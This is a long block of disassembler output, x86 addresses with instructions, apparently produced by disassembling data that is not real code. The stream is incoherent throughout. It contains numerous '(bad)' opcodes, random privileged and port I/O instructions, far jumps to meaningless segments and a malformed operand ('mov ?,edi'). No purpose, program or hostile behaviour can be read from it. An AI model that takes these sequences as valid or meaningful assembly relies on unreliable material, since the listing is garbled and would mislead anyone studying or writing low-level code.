  4944d6:	(bad)  
  4944d7:	daa    
  4944d8:	push   cs
  4944d9:	(bad)  
  4944db:	or     DWORD PTR [edi+0xf],esi
  4944de:	push   ss
  4944df:	push   cs
  4944e0:	das    
  4944e1:	es push ds
  4944e3:	push   es
  4944e4:	and    DWORD PTR [edx],esp
  4944e6:	pop    ds
  4944e7:	pop    ds
  4944e8:	pushfw 
  4944ea:	and    esp,DWORD PTR [esi-0x630001eb]
  4944f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4944f1:	add    edi,0x6
  4944f4:	scas   eax,DWORD PTR es:[edi]
  4944f5:	pop    esi
  4944f6:	addr16 push cs
  4944f8:	add    DWORD PTR [edi+0x1d],ebp
  4944fb:	pop    ss
  4944fc:	iret   
  4944fd:	pop    es
  4944fe:	pop    es
  4944ff:	bound  ebx,QWORD PTR [ebx]
  494501:	mov    ah,0xc0
  494503:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  494505:	xchg   DWORD PTR [ecx],eax
  494507:	test   bh,al
  494509:	sbb    dl,BYTE PTR [edi+esi*1]
  49450c:	(bad)  
  49450d:	jnp    0x4944e6
  49450f:	xor    al,dl
  494511:	call   FWORD PTR [edx-0x219700]
  494517:	push   es
  494518:	add    BYTE PTR [edi],0x76
  49451b:	mov    esp,0x281f07ff
  494520:	rcr    dh,1
  494522:	lods   eax,DWORD PTR ds:[esi]
  494523:	daa    
  494524:	test   DWORD PTR es:[ecx],0x5580ebc2
  49452b:	aaa    
  49452c:	mov    ?,edi
  49452e:	push   esi
  49452f:	pop    ds
  494530:	call   0xa84863f7
  494535:	test   al,0xa9
  494537:	imul   ebx,DWORD PTR [edi+0x618c169],0xb5fffff6
  494541:	mov    ds:0x260fee25,eax
  494546:	xchg   esi,eax
  494547:	inc    DWORD PTR [edi]
  494549:	jo     0x49457b
  49454b:	cmp    bl,BYTE PTR [eax-0x11]
  49454e:	dec    edi
  49454f:	push   esi
  494550:	mov    al,ds:0xa62c2f11
  494555:	push   ds
  494556:	inc    DWORD PTR [ecx-0x31be3879]
  49455c:	xchg   DWORD PTR [bp-0x20],eax
  494560:	push   ss
  494561:	jmp    0x307e:0x4f57fee1
  494568:	sbb    cl,al
  49456a:	out    dx,al
  49456b:	out    0x96,eax
  49456d:	pop    es
  49456e:	out    0x7b,eax
  494570:	loopne 0x494552
  494572:	inc    esi
  494573:	data16 jbe 0x49456d
  494576:	xchg   esi,eax
  494577:	mov    esi,0x89dc85a3
  49457c:	jmp    FWORD PTR [ebx]
  49457e:	mov    dh,0x60
  494580:	gs push eax
  494582:	mov    DWORD PTR [edi-0x52],eax
  494585:	std    
  494586:	inc    edi
  494587:	push   esi
  494588:	das    
  494589:	(bad)  
  49458b:	call   0x7f20e467
  494590:	push   es
  494591:	test   esi,0x5f07608d
  494597:	push   es
  494598:	jg     0x494528
  49459a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49459b:	stc    
  49459c:	int    0x78
  49459e:	idiv   edi
  4945a0:	mov    al,ds:0x21a1a0a0
  4945a5:	data16 mov bl,0xd9
  4945a8:	cs push ebp
  4945aa:	add    BYTE PTR [ebx],cl
  4945ac:	rcr    DWORD PTR [ebx-0x1d24062a],0xdd
  4945b3:	or     eax,DWORD PTR [edi]
  4945b5:	push   edi
  4945b6:	into   
  4945b7:	push   es
  4945b8:	ja     0x494629
  4945ba:	jae    0x4945df
  4945bc:	fdiv   DWORD PTR [esi+0x7]
  4945bf:	pop    edi
  4945c0:	ja     0x494551
  4945c2:	mov    al,ds:0x9f75b366
  4945c7:	xlat   BYTE PTR ds:[ebx]
  4945c8:	add    ch,bh
  4945ca:	ret    0x3dcd
  4945cd:	inc    ecx
  4945ce:	ins    BYTE PTR es:[edi],dx
  4945cf:	mov    dh,0x0
  4945d1:	rol    BYTE PTR [esi],cl
  4945d3:	str    WORD PTR [ebx]
  4945d6:	jne    0x49460b
  4945d8:	jb     0x494620
  4945da:	xor    eax,0x6f49d9b3
  4945df:	dec    ebx
  4945e0:	jo     0x4945e9
  4945e2:	inc    ebx
  4945e3:	out    dx,al
  4945e4:	mov    ch,0xef
  4945e6:	mov    es,WORD PTR [edi]
  4945e8:	imul   eax,DWORD PTR [eax],0xf723be45
  4945ee:	adc    dl,dh
  4945f0:	fmul   QWORD PTR [edx+0x5063717]
  4945f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4945f7:	add    ah,BYTE PTR [esi]
  4945f9:	pop    ebp
  4945fa:	add    edx,edi
  4945fc:	call   0x304e:0x1aa0d43
  494603:	pusha  
  494604:	adc    BYTE PTR ss:[eax-0x12f8dab5],0x52
  49460c:	and    DWORD PTR [eax],eax
  49460e:	push   edi
  49460f:	pop    es
  494610:	mov    ch,0x8a
  494612:	and    BYTE PTR [ebp+0x6f],dl
  494615:	mov    ch,0xbb
  494617:	mov    gs,WORD PTR [edx+0x27]
  49461a:	pop    es
  49461b:	push   ds
  49461c:	das    
  49461d:	adc    DWORD PTR [edi],eax
  49461f:	mov    BYTE PTR [ebp-0x3f],dh
  494622:	adc    eax,0x57070f0f
  494627:	sti    
  494628:	(bad)  
  494629:	dec    DWORD PTR [ebx]
  49462b:	inc    ecx
  49462c:	inc    eax
  49462d:	aas    
  49462e:	sbb    eax,0x5d646465
  494633:	push   0x68
  494635:	and    DWORD PTR [bx+0x64],0x60638763
  49463d:	pusha  
  49463e:	xchg   DWORD PTR [edx-0x44000100],eax
  494644:	test   WORD PTR [esi-0x7a7cf87d],dx
  49464b:	xchg   BYTE PTR [ebp-0x78828489],al
  494651:	jp     0x4946d1
  494653:	add    BYTE PTR [edi-0x787c7d83],0x80
  49465a:	test   ecx,edi
  49465c:	(bad)  
  49465d:	(bad)  
  49465e:	inc    DWORD PTR [edi-0x75777d79]
  494664:	xchg   DWORD PTR [ebp-0x79787375],eax
  49466a:	lea    ecx,[esi-0x70717779]
  494670:	xchg   DWORD PTR [ecx-0x75786f71],ecx
  494676:	nop
  494677:	xchg   ecx,eax
  494678:	xchg   DWORD PTR [ecx+edx*4-0x1084496e],ecx
  49467f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  494680:	nop
  494681:	mov    cl,BYTE PTR [edi+0x3f902e91]
  494687:	push   es
  494688:	push   esi
  494689:	mov    WORD PTR [ebp+0x675098d4],cs
  49468f:	push   es
  494690:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  494691:	scas   eax,DWORD PTR es:[edi]
  494692:	fwait
  494693:	in     eax,dx
  494694:	mov    ebx,0x260736e7
  494699:	pop    es
  49469a:	xchg   ebx,eax
  49469b:	add    BYTE PTR [ecx+0x3423637d],al
  4946a1:	pusha  
  4946a2:	dec    edx
  4946a3:	xor    eax,0xc70db731
  4946a8:	inc    edi
  4946a9:	xor    eax,0x61625fdb
  4946ae:	pusha  
  4946af:	sub    DWORD PTR [esi-0x4683f00],ecx
  4946b5:	dec    esi
  4946b6:	pop    ebp
  4946b7:	jb     0x49463d
  4946b9:	jge    0x494641
  4946bb:	call   DWORD PTR [eax+0x2f7fd700]
  4946c1:	lods   al,BYTE PTR ds:[esi]
  4946c2:	loope  0x494688
  4946c4:	rcr    BYTE PTR [esi-0xf430102],1
  4946ca:	ret    0xe0b
  4946cd:	push   ds
  4946ce:	inc    esi
  4946cf:	ins    BYTE PTR es:[edi],dx
  4946d0:	(bad)  
  4946d1:	adc    ch,BYTE PTR [edi]
  4946d3:	push   ss
  4946d4:	out    0xef,al
  4946d6:	jnp    0x49469a
  4946d8:	or     DWORD PTR [edi-0x11],ecx
  4946db:	(bad)  
  4946dc:	mul    BYTE PTR [edi+0x63]
  4946df:	mov    cl,dh
  4946e1:	popf   
  4946e2:	es aaa 
  4946e4:	retf   
  4946e5:	cs ss popf 
  4946e8:	xor    dl,al
  4946ea:	or     esp,DWORD PTR [esi+0x3b080e0e]
  4946f0:	mov    ch,0xc2
  4946f2:	scas   al,BYTE PTR es:[edi]
  4946f3:	mov    esi,0xb18ef567
  4946f8:	rcl    BYTE PTR [esi-0x4a],1
  4946fb:	ds sti 
  4946fd:	idiv   BYTE PTR [ebp-0x55f186f8]
  494703:	dec    esi
  494704:	inc    edi
  494705:	jle    0x494726
  494707:	or     esi,DWORD PTR [esi-0x54]
  49470a:	push   0x7d
  49470c:	xor    DWORD PTR [ecx],esi
  49470e:	xor    BYTE PTR [ebx],cl
  494710:	dec    esi
  494711:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  494712:	inc    esi
  494713:	fwait
  494714:	add    BYTE PTR [ecx],cl
  494716:	addr16 cdq 
  494718:	int    0xff
  49471a:	call   0xf04e:0xe36697ff
  494721:	ret    0xd7be
  494724:	test   dh,0xf3
  494727:	add    eax,0x777e183a
  49472c:	pop    edi
  49472d:	enter  0xc8c8,0x78
  494731:	call   0x46a0cac2
  494736:	fstp   QWORD PTR ds:[ebx]
  494739:	jecxz  0x494701
  49473b:	inc    esi
  49473c:	(bad)  
  49473d:	mov    dh,0xf
  49473f:	adc    ecx,DWORD PTR es:[esi]
  494742:	in     al,dx
  494743:	loopne 0x49477c
  494745:	lahf   
  494746:	add    BYTE PTR [edi+0x2ac43186],bh
  49474c:	mov    eax,0x962ea7a7
  494751:	ror    BYTE PTR [ecx],0xab
  494754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  494755:	into   
  494756:	es nop
  494758:	mov    esp,DWORD PTR [esi-0x5]
  49475b:	jle    0x49475a
  49475d:	lahf   
  49475e:	add    BYTE PTR [edi+0x13063303],ah
  494764:	retf   0xfc19
  494767:	xchg   DWORD PTR [ebp+0x6c],ebp
  49476a:	push   0x21
  49476c:	call   0xc007:0x57e79999
  494773:	mov    bl,0x21
  494775:	js     0x4947cd
  494777:	xchg   edi,eax
  494778:	cwde   
  494779:	add    BYTE PTR [edi+0x4d8c58d5],ch
  49477f:	aaa    
  494780:	bswap  edi
  494782:	mov    al,0xc2
  494784:	sbb    al,BYTE PTR [edi-0x5361414a]
  49478a:	(bad)  
  49478b:	loope  0x49474a
  49478d:	sahf   
  49478e:	out    dx,eax
  49478f:	jle    0x4947b0
  494791:	add    al,BYTE PTR [ebx+0x3fe72ab7]
  494797:	es (bad) 
  494799:	fsubr  DWORD PTR [ecx+0x1e576f55]
  49479f:	out    dx,al
  4947a0:	loope  0x494743
  4947a2:	and    DWORD PTR [esi-0x1c91b0ca],esi
  4947a8:	mov    fs,WORD PTR [esi-0x5]
  4947ab:	pop    edi
  4947ac:	ret    0xdf00
  4947af:	and    DWORD PTR [ecx-0x71],ecx
  4947b2:	pop    es
  4947b3:	mov    ch,0x16
  4947b5:	jl     0x494737
  4947b7:	ja     0x49482f
  4947b9:	jae    0x49482c
  4947bb:	sub    esp,DWORD PTR [esi+ebx*4-0xf]
  4947bf:	inc    esi
  4947c0:	shl    DWORD PTR [eax-0x49],0xda
  4947c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4947c5:	add    bh,bh
  4947c7:	outs   dx,DWORD PTR ds:[esi]
  4947c8:	mov    es,WORD PTR [edi-0x3c769ca8]
  4947ce:	pop    si
  4947d0:	cmp    DWORD PTR cs:[esi+eax*4],ecx
  4947d4:	cmp    edi,DWORD PTR [edi]
  4947d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4947d7:	out    dx,eax
  4947d8:	mov    ecx,0x2ec42d66
  4947de:	(bad)  
  4947df:	xchg   edi,eax
  4947e0:	psllw  mm2,QWORD PTR [esi]
  4947e3:	outs   dx,DWORD PTR ds:[esi]
  4947e4:	ret    
  4947e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4947e6:	daa    
  4947e7:	cs pop es
  4947e9:	mov    bh,0xc4
  4947eb:	pop    ebx
  4947ec:	jecxz  0x4947c4
  4947ee:	(bad)  
  4947ef:	das    
  4947f0:	scas   al,BYTE PTR es:[edi]
  4947f1:	inc    esi
  4947f2:	bound  esi,QWORD PTR [eax+0x70]
  4947f5:	pop    es
  4947f6:	xchg   DWORD PTR [esi],ebp
  4947f8:	out    0x86,eax
  4947fa:	inc    ecx
  4947fb:	mov    bl,0x3d
  4947fd:	js     0x494855
  4947ff:	mov    esi,0x532be700
  494805:	jle    0x4947e6
  494807:	or     al,0x20
  494809:	iret   
  49480a:	and    ecx,DWORD PTR [ecx]
  49480c:	jne    0x49483b
  49480e:	mov    eax,ds:0x53f19fa0
  494813:	aaa    
  494814:	(bad)  
  494815:	pop    edx
  494816:	mov    BYTE PTR ds:[esi],0x5b
  49481a:	mov    eax,ds:0x8fcec1c5
  49481f:	push   ds
  494820:	iret   
  494821:	pop    es
  494822:	add    bl,BYTE PTR [ebx+0x2f9ec4b1]
  494828:	sbb    edi,DWORD PTR [esp+ebx*1]
  49482b:	jbe    0x494894
  49482d:	sahf   
  49482e:	out    0x46,eax
  494830:	out    dx,eax
  494831:	jbe    0x49481e
  494833:	arpl   cx,ax
  494835:	outs   dx,DWORD PTR ds:[esi]
  494836:	daa    
  494837:	nop    esi
  49483a:	popa   
  49483b:	mov    eax,ds:0x7f2f77
  494840:	data16 jnp 0x4947f4
  494843:	(bad)  
  494844:	jle    0x4947dc
  494846:	mov    edi,0x87ff0084
  49484b:	fadd   st(5),st
  49484d:	ret    
  49484e:	inc    ecx
  49484f:	scas   eax,DWORD PTR es:[edi]
  494850:	(bad)  
  494851:	movd   DWORD PTR [ecx],mm4
  494854:	iret   
  494855:	pop    ds
  494856:	cmp    al,0x1f
  494858:	jle    0x494843
  49485a:	sub    ch,BYTE PTR [edx]
  49485c:	sub    dl,BYTE PTR [ebp+0x25]
  49485f:	test   al,0x83
  494861:	fimul  DWORD PTR [edi]
  494863:	ja     0x4948da
  494865:	jb     0x494894
  494867:	mov    ds:0x5d1ef1ae,eax
  49486c:	ins    BYTE PTR es:[edi],dx
  49486d:	add    BYTE PTR [esi+0x36],ch
  494870:	push   es
  494871:	outs   dx,DWORD PTR ds:[esi]
  494872:	pop    ds
  494873:	mov    al,0xea
  494875:	ins    DWORD PTR es:[edi],dx
  494876:	shl    dh,1
  494878:	daa    
  494879:	sysret 
  49487b:	loope  0x49485e
  49487d:	pusha  
  49487e:	lock (bad) 
  494880:	jg     0x494880
  494882:	push   edi
  494883:	cmp    BYTE PTR [edx],bl
  494885:	sbb    al,0xac
  494887:	out    dx,eax
  494888:	pop    edi
  494889:	jle    0x494842
  49488b:	mov    dh,0xf
  49488d:	sbb    eax,0xee27872c
  494892:	imul   eax,DWORD PTR [eax],0xffffffff
  494895:	je     0x494870
  494897:	ds jnp 0x4948fe
  49489a:	pop    es
  49489b:	push   esp
  49489c:	add    BYTE PTR [edi],cl
  49489e:	pop    ecx
  49489f:	add    bh,bh
  4948a1:	pushf  
  4948a2:	pop    eax
  4948a3:	mov    eax,0x8bffb30b
  4948a8:	pop    ss
  4948a9:	pop    edi
  4948aa:	xchg   esi,eax
  4948ab:	loopne 0x4948e8
  4948ad:	push   cs
  4948ae:	and    BYTE PTR [edi+0x78],bh
  4948b1:	sub    BYTE PTR ds:0xf1a3a4a5,0x20
  4948b8:	sbb    al,0xf4
  4948ba:	into   
  4948bb:	outs   dx,DWORD PTR ds:[esi]
  4948bc:	mov    esi,0x774cae07
  4948c1:	lock pop eax
  4948c3:	push   edi
  4948c4:	mov    gs,WORD PTR [edi]
  4948c6:	add    ebp,edi
  4948c8:	pop    ds
  4948c9:	scas   eax,DWORD PTR es:[edi]
  4948ca:	xchg   DWORD PTR [esi],ecx
  4948cc:	pop    edi
  4948cd:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4948cf:	jg     0x494851
  4948d1:	loope  0x494861
  4948d3:	push   ds
  4948d4:	es push edi
  4948d6:	fdivp  st(7),st
  4948d8:	ret    
  4948d9:	jecxz  0x49493b
  4948db:	aad    0x3f
  4948dd:	daa    
  4948de:	into   
  4948df:	xlat   BYTE PTR ds:[ebx]
  4948e0:	imul   esi,DWORD PTR [ecx+eiz*2-0x40],0x3e
  4948e5:	(bad)  
  4948e6:	push   ss
  4948e7:	xchg   esi,eax
  4948e9:	shr    bl,0x4f
  4948ec:	cs push esi
  4948ee:	mov    edi,0x92377b82
  4948f3:	data16 outs dx,BYTE PTR ds:[esi]
  4948f5:	lahf   
  4948f6:	into   
  4948f7:	jg     0x4948f9
  4948f9:	fimul  DWORD PTR [edx+0x2d0079a3]
  4948ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  494900:	xchg   esi,eax
  494901:	icebp  
  494902:	sbb    eax,0x5fab42c0
  494907:	outs   dx,DWORD PTR ss:[esi]
  494909:	sbb    eax,0x8e8f1f6c
  49490e:	add    DWORD PTR [bx],edx
  494911:	add    al,0x2c
  494913:	mov    esi,0xe6977f56
  494918:	xor    BYTE PTR [edi],0xb8
  49491b:	fadd   DWORD PTR [edi-0x1f0089f9]
  494921:	pusha  
  494922:	lds    ebx,FWORD PTR [ebx+0x6f]
  494925:	pop    es
  494926:	pop    es
  494927:	mov    bh,0x41
  494929:	cmp    esi,esp
  49492b:	mov    al,0x97
  49492d:	daa    
  49492e:	out    0x4e,eax
  494930:	pop    es
  494931:	add    esi,DWORD PTR [edi-0x1881e039]
  494937:	push   ss
  494938:	mov    ecx,esp
  49493a:	add    ecx,DWORD PTR [eax]
  49493c:	jg     0x4949b8
  49493e:	js     0x494924
  494940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  494941:	icebp  
  494942:	cmp    al,bl
  494944:	mov    es,WORD PTR [esi]
  494946:	outs   dx,BYTE PTR ds:[esi]
  494947:	das    
  494948:	pop    es
  494949:	xchg   DWORD PTR [eax+0x6f],esi
  49494c:	mov    al,0x1
  49494e:	out    0x96,eax
  494950:	mov    edi,0xb1d63e01
  494955:	or     edi,edi
  494957:	xchg   DWORD PTR [edi+0x49],edi
  49495a:	add    DWORD PTR [ebx+0x16d66f8c],0xffffffd0
  494961:	xlat   BYTE PTR ds:[ebx]
  494962:	and    ch,BYTE PTR [ebp+0xe07ef0f]
  494968:	cmp    bl,BYTE PTR [eax]
  49496a:	lods   al,BYTE PTR ds:[esi]
  49496b:	test   DWORD PTR [esi-0x3e38d129],0x3e7f0b43
  494975:	jg     0x4949f5
  494977:	mov    al,ds:0x7f8220e2
  49497c:	jnp    0x49497e
  49497e:	sub    eax,0x2808b08
  494983:	pop    esi
  494984:	icebp  
  494985:	pop    edi
  494986:	js     0x4949f4
  494988:	add    bl,ah
  49498a:	inc    esi
  49498b:	movq   mm0,QWORD PTR [esi+0xac1dd30]
  494992:	jbe    0x4949d3
  494994:	add    ebx,edi
  494996:	pop    es
  494997:	stos   DWORD PTR es:[edi],eax
  494998:	xchg   DWORD PTR [ebx-0x11],edi
  49499b:	mov    dh,0xf7
  49499d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49499e:	aas    
  49499f:	sbb    eax,DWORD PTR [edi+esi*4]
  4949a2:	dec    ecx
  4949a3:	inc    edi
  4949a4:	add    BYTE PTR [edi+0x1f],bh
  4949a7:	pop    eax
  4949a8:	pusha  
  4949a9:	dec    ebp
  4949aa:	pop    edx
  4949ab:	(bad)  
  4949ac:	push   ds
  4949ad:	xor    BYTE PTR [eax],bh
  4949af:	pop    eax
  4949b0:	mov    ebx,0x7eff2737
  4949b5:	cmp    BYTE PTR [eax-0x41388fa0],al
  4949bb:	jg     0x494a39
  4949bd:	sti    
  4949be:	sbb    dl,BYTE PTR [ebp*4-0x954d300]
  4949c5:	icebp  
  4949c6:	popw   es
  4949c8:	push   es
  4949c9:	add    BYTE PTR [edi-0x75],cl
  4949cc:	add    DWORD PTR [edi+0x705a1706],0xffffffc0
  4949d3:	aad    0x1e
  4949d5:	xchg   DWORD PTR [esi-0x43efdff9],ecx
  4949db:	dec    ebp
  4949dc:	pop    ds
  4949dd:	out    0x57,eax
  4949df:	jbe    0x494a0d
  4949e1:	ror    BYTE PTR [esi],cl
  4949e3:	mov    edi,0x6c157fcf
  4949e8:	adc    cl,BYTE PTR [esi]
  4949ea:	(bad)  
  4949eb:	xlat   BYTE PTR ds:[bx]
  4949ed:	pop    eax
  4949ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4949ef:	shl    BYTE PTR [ebp+0x2a0b3f37],1
  4949f5:	push   es
  4949f6:	and    bh,BYTE PTR [edi+0x7d]
  4949f9:	add    BYTE PTR ds:0xeff1ab4c,ch
  4949ff:	adc    BYTE PTR [edi],0x6
  494a02:	pop    si
  494a04:	pop    esi
  494a05:	xadd   DWORD PTR [ebx],edi
  494a08:	lods   eax,DWORD PTR ds:[esi]
  494a09:	pop    ebx
  494a0a:	push   edi
  494a0b:	push   es
  494a0c:	daa    
  494a0d:	push   edi
  494a0e:	mov    bh,0x0
  494a10:	and    DWORD PTR [ebx+0x47],0x2f
  494a14:	out    0x36,eax
  494a16:	add    DWORD PTR [edi-0x55],edx
  494a19:	mov    fs,WORD PTR [edi+0x6136036f]
  494a1f:	adc    eax,0x82dfff2f
  494a24:	rol    ecx,0x68
  494a27:	test   BYTE PTR [edi+0x66],0x7f
  494a2b:	loopne 0x4949cd
  494a2d:	loop   0x4949d7
  494a2f:	jle    0x494a31
  494a31:	sub    eax,0xe2d4f14e
  494a36:	popf   
  494a37:	mov    ch,0x77
  494a39:	(bad)  
  494a3a:	femms  
  494a3c:	inc    esi
  494a3d:	rcr    DWORD PTR [ebp-0x14],1
  494a40:	iret   
  494a41:	pop    es
  494a42:	xchg   esi,eax
  494a43:	mov    bh,0x8d
  494a45:	cmp    BYTE PTR ds:0xe97668d,bl
  494a4b:	bswap  ebp
  494a4d:	mov    edx,0x5ff7acd8
  494a52:	jmp    FWORD PTR [ebp+0x7ad5600]
  494a58:	pop    ss
  494a59:	add    eax,0x7ceaeab
  494a5e:	cs xchg edi,eax
  494a60:	jg     0x494ae1
  494a62:	rcl    DWORD PTR [ecx-0x3b],0x1
  494a66:	jg     0x494a68
  494a68:	sub    eax,0x3466f1d6
  494a6d:	js     0x494a2a
  494a6f:	adc    BYTE PTR [edi+0xf],0x9e
  494a73:	pop    edx
  494a74:	add    DWORD PTR [eax+esi*8-0x3da8a1f1],edi
  494a7b:	add    BYTE PTR [edi],bl
  494a7d:	sub    edx,DWORD PTR [edi-0x73b5f8e1]
  494a83:	loopne 0x494adb
  494a85:	(bad)  
  494a86:	(bad)  
  494a87:	jg     0x494a18
  494a89:	push   esi
  494a8a:	mov    WORD PTR [eax-0x3d],fs
  494a8d:	out    0x87,eax
  494a8f:	aaa    
  494a90:	adc    DWORD PTR [eax+0x6f],esi
  494a93:	lock inc edi
  494a95:	jle    0x494b16
  494a97:	outs   dx,BYTE PTR ds:[esi]
  494a98:	push   cs
  494a99:	lock lock mov al,BYTE PTR [edx-0x31d28381]
  494aa1:	icebp  
  494aa2:	xchg   esi,eax
  494aa3:	pop    eax
  494aa4:	pusha  
  494aa5:	loopne 0x494a96
  494aa7:	outs   dx,BYTE PTR ds:[esi]
  494aa8:	push   es
  494aa9:	lods   al,BYTE PTR ds:[esi]
  494aab:	pop    edx
  494aac:	pop    ss
  494aad:	test   edi,0x457faf8e
  494ab3:	and    BYTE PTR [ecx],0x56
  494ab6:	pop    es
  494ab7:	addr16 inc edi
  494ab9:	sbb    BYTE PTR [esi],al
  494abb:	or     eax,DWORD PTR [eax+0x2e051f57]
  494ac1:	push   eax
  494ac2:	mov    cl,0xf
  494ac4:	pop    es
  494ac5:	aas    
  494ac6:	jg     0x494ad2
  494ac8:	out    dx,al
  494ac9:	or     BYTE PTR [ebx+0x7faee66f],0x2f
  494ad0:	fdivr  st(6),st
  494ad2:	add    ecx,DWORD PTR [ebp-0xbd47373]
  494ad8:	(bad)
  494adb:	push   cs
  494adc:	xor    eax,0x7778068a
  494ae1:	mov    es,edi
  494ae3:	shl    DWORD PTR [edi+ebp*2+0x60],0x7
  494ae8:	push   esi
  494ae9:	aas    
  494aea:	add    ecx,edi
  494aec:	mov    al,0x2
  494aee:	sbb    dl,ah
  494af0:	out    dx,eax
  494af1:	xchg   esi,eax
  494af2:	xlat   BYTE PTR ds:[ebx]
  494af3:	fisubr WORD PTR [edx-0x7880ee9d]
  494af9:	inc    edi
  494afa:	inc    esp
  494afb:	shr    DWORD PTR ds:0x7f369f02,0xf
  494b02:	cwde   
  494b03:	int    0x76
  494b05:	cdq    
  494b06:	add    BYTE PTR [ebx],ch
  494b08:	xlat   BYTE PTR ds:[ebx]
  494b09:	out    dx,eax
  494b0a:	out    0x76,al
  494b0c:	out    dx,al
  494b0d:	arpl   WORD PTR [ebp+0x7],bx
  494b10:	ja     0x494ac1
  494b12:	dec    edi
  494b13:	(bad)  
  494b14:	push   ss
  494b15:	sbb    al,0x9c
  494b17:	sahf   
  494b18:	pop    ss
  494b19:	push   cs
  494b1a:	pop    ds
  494b1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  494b1c:	xchg   ecx,eax
  494b1d:	cld    
  494b1e:	arpl   cx,si
  494b20:	out    dx,eax
  494b21:	push   es
  494b22:	xchg   ebx,eax
  494b24:	ret    
  494b25:	ret    
  494b26:	add    BYTE PTR [edx+0x76071b81],0x7f
  494b2d:	test   BYTE PTR [ecx],dl
  494b2f:	cwde   
  494b30:	in     eax,dx
  494b31:	cwde   
  494b32:	add    BYTE PTR [ebx],ch
  494b34:	(bad)  
  494b35:	jg     0x494ae2
  494b37:	rcl    ebx,0x68
  494b3a:	ds push ds
  494b3c:	scas   eax,DWORD PTR es:[edi]
  494b3d:	push   ss
  494b3e:	lahf   
  494b3f:	cmp    al,al
  494b41:	add    DWORD PTR [ebx+0x1b179676],eax
  494b47:	outs   dx,DWORD PTR ds:[esi]
  494b48:	rol    DWORD PTR [eax],cl
  494b4a:	jle    0x494b63
  494b4c:	inc    edi
  494b4d:	loopne 0x494baf
  494b4f:	push   ebp
  494b50:	(bad)  
  494b51:	push   ds
  494b52:	xchg   DWORD PTR [edi+0x3c],esp
  494b55:	adc    BYTE PTR ds:0x80fff736,al
  494b5b:	sub    DWORD PTR [ebx],0x2
  494b5e:	pop    eax
  494b5f:	shr    BYTE PTR ds:0x307f1b4,1
  494b65:	push   esi
  494b66:	jne    0x494b18
  494b68:	iret   
  494b69:	dec    edi
  494b6a:	(bad)  
  494b6b:	xchg   edi,eax
  494b6c:	loopne 0x494aef
  494b6e:	inc    ebp
  494b6f:	and    BYTE PTR [edi],0xc6
  494b72:	(bad)  
  494b73:	cmp    bl,ah
  494b75:	outs   dx,BYTE PTR ds:[esi]
  494b76:	pop    es
  494b77:	outs   dx,DWORD PTR ds:[esi]
  494b78:	xchg   DWORD PTR [edi],ebx
  494b7a:	sbb    ah,BYTE PTR [edx]
  494b7c:	inc    eax
  494b7d:	mov    DWORD PTR [edi+0x451f8806],0x7a7f2630
  494b87:	jg     0x494b0b
  494b89:	sub    eax,0x8a1c3183
  494b8e:	outs   dx,BYTE PTR ds:[esi]
  494b8f:	icebp  
  494b90:	pop    esi
  494b92:	push   ss
  494b93:	xor    DWORD PTR [eax],0xffffff80
  494b96:	jnp    0x494ba7
  494b98:	pop    ds
  494b99:	push   ss
  494b9a:	jg     0x494b38
  494b9c:	ds push esi
  494b9e:	popa   
  494b9f:	pop    ds
  494ba0:	xchg   DWORD PTR [esi-0x80],ecx
  494ba3:	rol    ebx,0xe
  494ba6:	movq   mm6,mm3
  494ba9:	mov    ds:0xf541837,eax
  494bae:	jle    0x494c17
  494bb0:	jbe    0x494bbc
  494bb2:	int    0x51
  494bb4:	or     al,0xff
  494bb6:	jnp    0x494be5
  494bb8:	arpl   WORD PTR [eax],bx
  494bba:	sbb    BYTE PTR [esi+edx*4-0xf],dl
  494bbe:	pop    es
  494bbf:	jbe    0x494b60
  494bc1:	pop    ds
  494bc2:	or     DWORD PTR [edi+0x7e7f0715],0xffffff87
  494bc9:	shl    DWORD PTR [esi+0x4f7f058b],0x3f
  494bd0:	xchg   edi,eax
  494bd1:	cmp    BYTE PTR [esi],cl
  494bd3:	push   esi
  494bd4:	mov    DWORD PTR [edi+0x460c877f],0x871685c7
  494bde:	push   esi
  494bdf:	repnz push esp
  494be1:	sbb    al,0x43
  494be3:	inc    esi
  494be4:	jg     0x494b67
  494be6:	test   BYTE PTR ds:0x806c7878,ch
  494bec:	pop    ss
  494bed:	push   cs
  494bee:	xchg   edi,eax
  494bef:	fsub   DWORD PTR [esp+edi*2]
  494bf2:	lods   al,BYTE PTR ds:[esi]
  494bf3:	pop    es
  494bf4:	xchg   DWORD PTR [edi+0x13b70f70],eax
  494bfa:	outs   dx,DWORD PTR ds:[esi]
  494bfb:	push   ss
  494bfc:	push   edi
  494bfd:	add    BYTE PTR [ecx+eax*1-0x7870e4e3],al
  494c04:	scas   eax,DWORD PTR es:[edi]
  494c05:	xchg   DWORD PTR ds:0x177fef8b,eax
  494c0b:	pop    esi
  494c0c:	add    eax,0x7f0441e6
  494c11:	jge    0x494b95
  494c13:	jl     0x494bcb
  494c15:	cmp    ebx,esp
  494c17:	cwde   
  494c18:	mov    dh,0xf1
  494c1a:	inc    DWORD PTR [edi]
  494c1c:	pop    ds
  494c1d:	xchg   DWORD PTR [eax+0x74d181b],esi
  494c23:	jmp    DWORD PTR [ecx+0x1d]
  494c26:	pop    esi
  494c27:	stos   DWORD PTR es:[edi],eax
  494c28:	pop    es
  494c29:	test   DWORD PTR [edi+0x58e20dc1],0x7f568716
  494c33:	cld    
  494c34:	sub    BYTE PTR [esi],ch
  494c36:	fcom   QWORD PTR [esi]
  494c38:	jg     0x494bbd
  494c3a:	test   DWORD PTR ds:0x3084abb6,ebp
  494c40:	xor    al,0xc6
  494c42:	icebp  
